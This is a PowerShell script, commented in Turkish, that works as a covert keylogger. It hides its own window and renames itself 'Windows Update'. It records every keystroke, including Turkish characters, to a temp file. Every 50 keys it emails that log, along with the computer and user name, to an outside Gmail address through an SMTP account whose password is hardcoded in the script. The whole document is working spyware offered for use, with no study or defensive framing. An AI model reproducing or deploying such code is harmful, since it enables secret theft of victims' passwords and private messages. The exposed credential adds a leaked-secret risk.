# Pencereyi tamamen gizle
$signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
'@
Add-Type -MemberDefinition $signature -Name Win32ShowWindowAsync -Namespace Win32Functions

$process = Get-Process -Id $PID
$hwnd = $process.MainWindowHandle
if ($hwnd -ne [IntPtr]::Zero) {
    [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($hwnd, 0)
}
$host.UI.RawUI.WindowTitle = "Windows Update"

# Türkçe karakter desteği için gelişmiş API
$apiCode = @'
[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, 
    System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int GetKeyboardLayout(int threadId);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpkeystate,
    System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
'@

Add-Type -MemberDefinition $apiCode -Name 'Keyboard' -Namespace 'Win32'

# Log dosyası
$LogFile = "$env:TEMP\system_log.txt"

# Email ayarları
$SMTP = "mail.netiletisim.com.tr"
$From = "efe.aslan@netiletisim.com.tr"
$To = "efeaslan1995@gmail.com"
$Password = "U)q(ug=88KPT" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($From, $Password)

$counter = 0

# Klavye layout ID'sini al
$hkl = [Win32.Keyboard]::GetKeyboardLayout(0)

while($true) {
    Start-Sleep -Milliseconds 5  # Daha hızlı tarama
    
    # Tüm tuş kodlarını tarama (8-254)
    for($keyCode = 8; $keyCode -le 254; $keyCode++) {
        $state = [Win32.Keyboard]::GetAsyncKeyState($keyCode)
        
        if($state -eq -32767) {  # Tuş basıldı
            $counter++
            
            # Shift, Ctrl, Alt durumlarını kontrol et
            $shiftState = [Win32.Keyboard]::GetAsyncKeyState(16)  # Shift
            $ctrlState = [Win32.Keyboard]::GetAsyncKeyState(17)   # Ctrl
            $altState = [Win32.Keyboard]::GetAsyncKeyState(18)    # Alt
            
            # Klavye durumunu al
            $keyboardState = New-Object Byte[] 256
            [Win32.Keyboard]::GetKeyboardState($keyboardState)
            
            # Tuşu karaktere çevir (Türkçe karakter desteği ile)
            $virtualKey = [Win32.Keyboard]::MapVirtualKey($keyCode, 3)
            $charBuffer = New-Object System.Text.StringBuilder(5)
            
            # ToUnicodeEx kullanarak Türkçe karakter desteği
            $result = [Win32.Keyboard]::ToUnicodeEx($keyCode, $virtualKey, $keyboardState, 
                $charBuffer, $charBuffer.Capacity, 0, $hkl)
            
            $keyChar = ""
            
            # Özel tuşları işle
            if($keyCode -eq 8) { $keyChar = "[BS]" }
            elseif($keyCode -eq 9) { $keyChar = "[TAB]" }
            elseif($keyCode -eq 13) { $keyChar = "`r`n" }
            elseif($keyCode -eq 27) { $keyChar = "[ESC]" }
            elseif($keyCode -eq 32) { $keyChar = " " }
            elseif($keyCode -eq 46) { $keyChar = "[DEL]" }
            elseif($keyCode -eq 37) { $keyChar = "[LEFT]" }
            elseif($keyCode -eq 38) { $keyChar = "[UP]" }
            elseif($keyCode -eq 39) { $keyChar = "[RIGHT]" }
            elseif($keyCode -eq 40) { $keyChar = "[DOWN]" }
            elseif($result -gt 0) {
                # Karakter alındı
                $keyChar = $charBuffer.ToString()
                
                # Shift kontrolü (büyük/küçük harf)
                if($shiftState -ne 0) {
                    # Türkçe karakterler için özel işlem
                    $keyChar = switch($keyChar) {
                        'i' { 'İ' }
                        'ı' { 'I' }
                        'ğ' { 'Ğ' }
                        'ü' { 'Ü' }
                        'ş' { 'Ş' }
                        'ö' { 'Ö' }
                        'ç' { 'Ç' }
                        default { $keyChar.ToUpper() }
                    }
                }
            }
            
            # Log dosyasına yaz
            if($keyChar -ne "") {
                Add-Content -Path $LogFile -Value $keyChar -NoNewline -Encoding UTF8
            }
            
            # Her 50 karakterde bir ANINDA email gönder
            if($counter -ge 50) {
                try {
                    $Subject = "Keylogger Report - $env:COMPUTERNAME"
                    $Body = "Keylogger Report`r`nComputer: $env:COMPUTERNAME`r`nUser: $env:USERNAME`r`nTime: $(Get-Date -Format 'HH:mm:ss')"
                    
                    Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body `
                        -Attachments $LogFile -SmtpServer $SMTP -Port 25 -Credential $Credential
                    
                    # Email gönderildi, log dosyasını temizle
                    "" | Out-File $LogFile -Force -Encoding UTF8
                    $counter = 0
                    
                    # Sadece 1 saniye bekle (spam önlemek için minimum)
                    Start-Sleep -Seconds 1
                    
                } catch {
                    # Email gönderme hatası - 5 saniye bekle ve tekrar dene
                    Start-Sleep -Seconds 5
                }
            }
        }
    }
}